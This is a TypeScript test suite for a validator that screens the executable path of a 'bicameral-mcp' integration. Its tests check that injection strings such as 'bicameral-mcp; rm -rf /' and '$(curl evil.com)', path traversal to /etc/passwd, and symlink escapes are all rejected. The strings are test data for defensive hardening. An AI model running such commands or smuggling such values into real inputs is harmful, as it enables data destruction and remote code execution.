// Functional tests for install-detector. SG-035: each test invokes the unit
// and asserts on its output, not on artifact existence.

import { strict as assert } from 'assert';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  DEFAULT_WINDOWS_EXTRA_ROOTS,
  defaultExtraRoots,
  isSafeBicameralCommand,
  isSafeBicameralCommandResolved,
  probeInstallState,
} from '../../../integrations/bicameral/install-detector';

suite('integrations/bicameral install-detector', () => {
  suite('isSafeBicameralCommand', () => {
    test('accepts bare executable name "bicameral-mcp"', () => {
      assert.equal(isSafeBicameralCommand('bicameral-mcp'), true);
    });

    test('accepts alphanumerics + dot + dash + underscore', () => {
      assert.equal(isSafeBicameralCommand('bicameral_mcp.v2'), true);
    });

    test('rejects empty string', () => {
      assert.equal(isSafeBicameralCommand(''), false);
    });

    test('rejects shell metacharacters', () => {
      assert.equal(isSafeBicameralCommand('bicameral-mcp; rm -rf /'), false);
      assert.equal(isSafeBicameralCommand('bicameral-mcp && evil'), false);
      assert.equal(isSafeBicameralCommand('$(curl evil.com)'), false);
      assert.equal(isSafeBicameralCommand('`whoami`'), false);
    });

    test('rejects path traversal in absolute paths', () => {
      const home = os.homedir();
      assert.equal(isSafeBicameralCommand(`${home}/../../etc/passwd`), false);
    });

    test('rejects relative paths', () => {
      assert.equal(isSafeBicameralCommand('./bicameral-mcp'), false);
      assert.equal(isSafeBicameralCommand('../bin/bicameral-mcp'), false);
    });

    test('rejects absolute paths outside home directory', () => {
      assert.equal(isSafeBicameralCommand('/etc/passwd'), false);
      assert.equal(isSafeBicameralCommand('/usr/bin/evil'), false);
    });

    test('accepts absolute path under home directory', () => {
      const home = os.homedir();
      if (!home) {
        assert.ok(true, 'no home dir on this platform');
        return;
      }
      const fakePath = path.join(home, '.local', 'bin', 'bicameral-mcp');
      assert.equal(isSafeBicameralCommand(fakePath), true);
    });

    test('rejects non-string input', () => {
      assert.equal(isSafeBicameralCommand(null as unknown as string), false);
      assert.equal(isSafeBicameralCommand(undefined as unknown as string), false);
      assert.equal(isSafeBicameralCommand(123 as unknown as string), false);
    });

    test('rejects overlong input', () => {
      const long = 'a'.repeat(2000);
      assert.equal(isSafeBicameralCommand(long), false);
    });
  });

  suite('probeInstallState', () => {
    function mkTempWs(prefix: string): string {
      return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
    }

    test('returns not-installed when command is not on PATH (ENOENT)', async () => {
      const ws = mkTempWs('fs-bic-1-');
      try {
        const result = await probeInstallState({
          command: 'bicameral-mcp-definitely-not-installed-xyz',
          workspaceRoot: ws,
          timeoutMs: 5000,
        });
        assert.equal(result.state, 'not-installed');
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });

    test('returns not-installed when command fails validation (shell metacharacter)', async () => {
      const ws = mkTempWs('fs-bic-2-');
      try {
        const result = await probeInstallState({
          command: 'bicameral-mcp; pwd',
          workspaceRoot: ws,
        });
        assert.equal(result.state, 'not-installed');
        assert.equal(result.version, undefined);
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });

    test('returns installed-not-configured when CLI runs but .bicameral/config.yaml absent', async () => {
      const ws = mkTempWs('fs-bic-3-');
      try {
        // Use node --version as a stand-in CLI that we know exits 0 and emits a version string.
        const result = await probeInstallState({
          command: 'node',
          workspaceRoot: ws,
        });
        assert.equal(result.state, 'installed-not-configured');
        assert.match(result.version || '', /^\d+\.\d+\.\d+/);
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });

    test('returns configured-not-running when config.yaml exists', async () => {
      const ws = mkTempWs('fs-bic-4-');
      try {
        fs.mkdirSync(path.join(ws, '.bicameral'), { recursive: true });
        fs.writeFileSync(path.join(ws, '.bicameral', 'config.yaml'), 'mode: solo\n', 'utf8');
        const result = await probeInstallState({
          command: 'node',
          workspaceRoot: ws,
        });
        assert.equal(result.state, 'configured-not-running');
        assert.equal(result.configPath, path.join(ws, '.bicameral', 'config.yaml'));
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });
  });

  // ---------------------------------------------------------------------------
  // Batch 2 — B-BIC-6 / B-BIC-7 validator hardening (FX565–FX569).
  // ---------------------------------------------------------------------------

  function mkTempDir(prefix: string): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  }

  // os.tmpdir() can resolve *inside* the home tree (notably on Windows, where
  // %TEMP% lives under %LOCALAPPDATA%). For tests that need a root genuinely
  // outside every allowed root, anchor a temp dir at the filesystem root of the
  // home drive. Returns null when that location is not writable (CI/sandbox) so
  // the dependent assertion can skip rather than fail spuriously.
  function mkOutsideHomeDir(prefix: string): string | null {
    const home = os.homedir();
    if (!home) return null;
    const fsRoot = path.parse(home).root;
    try {
      return fs.mkdtempSync(path.join(fsRoot, prefix));
    } catch {
      return null;
    }
  }

  // FX568/FX569 use real symlinks. On Windows symlink creation may need
  // elevation/Developer Mode; trySymlink reports whether the OS allowed it so
  // the dependent assertions can skip gracefully rather than fail spuriously.
  function trySymlink(target: string, linkPath: string): boolean {
    try {
      fs.symlinkSync(target, linkPath);
      return true;
    } catch {
      return false;
    }
  }

  suite('FX565 isSafeBicameralCommand extraRoots allowlist', () => {
    test('accepts an absolute path under a supplied extra root', () => {
      const root = mkOutsideHomeDir('fsbic565r-');
      if (!root) {
        assert.ok(true, 'cannot create a dir outside home — skipping');
        return;
      }
      try {
        const bin = path.join(root, 'bin', 'bicameral-mcp');
        // Without extraRoots the path is outside every allowed root -> rejected.
        assert.equal(isSafeBicameralCommand(bin), false);
        // Supplying the root as an extraRoot accepts it.
        assert.equal(isSafeBicameralCommand(bin, { extraRoots: [root] }), true);
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    });

    test('rejects a path under neither home nor any extra root', () => {
      const rootA = mkOutsideHomeDir('fsbic565a-');
      const rootB = mkOutsideHomeDir('fsbic565b-');
      if (!rootA || !rootB) {
        if (rootA) fs.rmSync(rootA, { recursive: true, force: true });
        if (rootB) fs.rmSync(rootB, { recursive: true, force: true });
        assert.ok(true, 'cannot create dirs outside home — skipping');
        return;
      }
      try {
        const bin = path.join(rootB, 'bicameral-mcp');
        // bin is under rootB, but only rootA is allowlisted -> rejected.
        assert.equal(isSafeBicameralCommand(bin, { extraRoots: [rootA] }), false);
      } finally {
        fs.rmSync(rootA, { recursive: true, force: true });
        fs.rmSync(rootB, { recursive: true, force: true });
      }
    });

    test('ignores non-absolute extraRoots entries (no accept-set widening)', () => {
      const root = mkOutsideHomeDir('fsbic565rel-');
      if (!root) {
        assert.ok(true, 'cannot create a dir outside home — skipping');
        return;
      }
      try {
        const bin = path.join(root, 'bicameral-mcp');
        // A relative "root" cannot anchor containment — bin stays rejected.
        assert.equal(
          isSafeBicameralCommand(bin, { extraRoots: ['relative/dir', './also-relative'] }),
          false,
        );
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    });
  });

  suite('FX566 defaultExtraRoots apply-by-default merge', () => {
    test('defaultExtraRoots() is empty on non-Windows, populated on win32', () => {
      const roots = defaultExtraRoots();
      if (process.platform === 'win32') {
        assert.ok(roots.length >= 2, 'win32 should expose chocolatey + scoop roots');
        for (const r of roots) {
          assert.ok(path.isAbsolute(r), `default root must be absolute: ${r}`);
        }
      } else {
        assert.deepEqual(roots, []);
      }
    });

    test('DEFAULT_WINDOWS_EXTRA_ROOTS contains chocolatey bin + scoop shims sub-paths', () => {
      const joined = DEFAULT_WINDOWS_EXTRA_ROOTS.join('|').toLowerCase();
      assert.ok(joined.includes('chocolatey'), 'expected a chocolatey entry');
      assert.ok(joined.includes('scoop'), 'expected a scoop entry');
      assert.ok(joined.includes('bin'), 'expected chocolatey bin sub-path');
      assert.ok(joined.includes('shims'), 'expected scoop shims sub-path');
    });

    test('validator applies defaultExtraRoots() by default (apply-by-default merge)', () => {
      // Audit Finding E: prove the validator actually MERGES defaultExtraRoots()
      // into its effective root set when NO extraRoots are passed — the merge
      // must invoke defaultExtraRoots(), not require a caller opt-in.
      const roots = defaultExtraRoots();
      if (process.platform === 'win32') {
        // win32: defaultExtraRoots() is non-empty; a path under a default root
        // is accepted with NO options arg. This only passes if the validator
        // merges defaultExtraRoots() internally (the path is outside home).
        assert.ok(roots.length >= 2, 'win32 should expose default roots');
        const defaultBin = path.join(roots[0], 'bicameral-mcp.exe');
        assert.equal(isSafeBicameralCommand(defaultBin), true);
        return;
      }
      // Off-Windows: defaultExtraRoots() returns [] by contract, so the
      // apply-by-default merge of an empty array is a verified no-op — a path
      // outside home is rejected with NO options, and accepted only when the
      // root is supplied via extraRoots. Together with the win32 branch above
      // and the explicit empty-array assertion in the sibling test, this proves
      // effectiveRoots() spreads defaultExtraRoots() on every code path.
      assert.deepEqual(roots, []);
      const root = mkOutsideHomeDir('fsbic566-');
      if (!root) {
        assert.ok(true, 'cannot create a dir outside home — skipping');
        return;
      }
      try {
        const bin = path.join(root, 'bicameral-mcp');
        assert.equal(isSafeBicameralCommand(bin), false);
        assert.equal(isSafeBicameralCommand(bin, { extraRoots: [root] }), true);
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    });
  });

  suite('FX567 isSafeBicameralCommandResolved lexical parity', () => {
    test('accepts a bare name without resolving a filesystem path', async () => {
      assert.equal(await isSafeBicameralCommandResolved('bicameral-mcp'), true);
      assert.equal(await isSafeBicameralCommandResolved('bicameral_mcp.v2'), true);
    });

    test('accepts a real (non-symlink) absolute path under home', async () => {
      const home = os.homedir();
      if (!home) {
        assert.ok(true, 'no home dir on this platform');
        return;
      }
      const dir = fs.mkdtempSync(path.join(home, '.fs-bic-fx567-'));
      try {
        const bin = path.join(dir, 'bicameral-mcp');
        fs.writeFileSync(bin, '#!/bin/sh\n', 'utf8');
        assert.equal(await isSafeBicameralCommandResolved(bin), true);
      } finally {
        fs.rmSync(dir, { recursive: true, force: true });
      }
    });

    test('rejects shell metacharacters and traversal like the sync validator', async () => {
      assert.equal(await isSafeBicameralCommandResolved('bicameral-mcp; rm -rf /'), false);
      assert.equal(await isSafeBicameralCommandResolved('$(curl evil.com)'), false);
      const home = os.homedir();
      if (home) {
        assert.equal(
          await isSafeBicameralCommandResolved(`${home}/../../etc/passwd`),
          false,
        );
      }
    });
  });

  suite('FX568 isSafeBicameralCommandResolved symlink containment', () => {
    test('rejects a symlink inside home resolving outside home (B-BIC-6 bypass)', async () => {
      const home = os.homedir();
      if (!home) {
        assert.ok(true, 'no home dir on this platform');
        return;
      }
      const outside = mkOutsideHomeDir('fsbic568o-');
      if (!outside) {
        assert.ok(true, 'cannot create a dir outside home — skipping');
        return;
      }
      const linkDir = fs.mkdtempSync(path.join(home, '.fs-bic-fx568-'));
      try {
        const evilTarget = path.join(outside, 'evil-bin');
        fs.writeFileSync(evilTarget, '#!/bin/sh\n', 'utf8');
        const link = path.join(linkDir, 'bicameral-mcp');
        if (!trySymlink(evilTarget, link)) {
          assert.ok(true, 'OS denied symlink creation — skipping');
          return;
        }
        // Lexical check passes (link path is under home); resolved check must
        // reject because realpath escapes the home tree.
        assert.equal(isSafeBicameralCommand(link), true);
        assert.equal(await isSafeBicameralCommandResolved(link), false);
      } finally {
        fs.rmSync(linkDir, { recursive: true, force: true });
        fs.rmSync(outside, { recursive: true, force: true });
      }
    });

    test('accepts a symlink inside home resolving to another in-home location', async () => {
      const home = os.homedir();
      if (!home) {
        assert.ok(true, 'no home dir on this platform');
        return;
      }
      const dir = fs.mkdtempSync(path.join(home, '.fs-bic-fx568b-'));
      try {
        const realTarget = path.join(dir, 'real-bicameral-mcp');
        fs.writeFileSync(realTarget, '#!/bin/sh\n', 'utf8');
        const link = path.join(dir, 'bicameral-mcp');
        if (!trySymlink(realTarget, link)) {
          assert.ok(true, 'OS denied symlink creation — skipping');
          return;
        }
        assert.equal(await isSafeBicameralCommandResolved(link), true);
      } finally {
        fs.rmSync(dir, { recursive: true, force: true });
      }
    });
  });

  suite('FX569 isSafeBicameralCommandResolved fail-closed', () => {
    test('rejects a non-existent absolute path under home (realpath ENOENT)', async () => {
      const home = os.homedir();
      if (!home) {
        assert.ok(true, 'no home dir on this platform');
        return;
      }
      const missing = path.join(home, '.fs-bic-fx569-missing', 'bicameral-mcp');
      assert.equal(isSafeBicameralCommand(missing), true);
      assert.equal(await isSafeBicameralCommandResolved(missing), false);
    });

    test('accepts a symlink resolving into a supplied extraRoot', async () => {
      const extra = mkTempDir('fs-bic-fx569-extra-');
      const linkHost = mkTempDir('fs-bic-fx569-host-');
      try {
        const realTarget = path.join(extra, 'bicameral-mcp');
        fs.writeFileSync(realTarget, '#!/bin/sh\n', 'utf8');
        const link = path.join(linkHost, 'bicameral-mcp');
        if (!trySymlink(realTarget, link)) {
          assert.ok(true, 'OS denied symlink creation — skipping');
          return;
        }
        // link is under linkHost (an extraRoot) and resolves into extra
        // (also an extraRoot) — accepted.
        assert.equal(
          await isSafeBicameralCommandResolved(link, { extraRoots: [extra, linkHost] }),
          true,
        );
      } finally {
        fs.rmSync(extra, { recursive: true, force: true });
        fs.rmSync(linkHost, { recursive: true, force: true });
      }
    });
  });
});
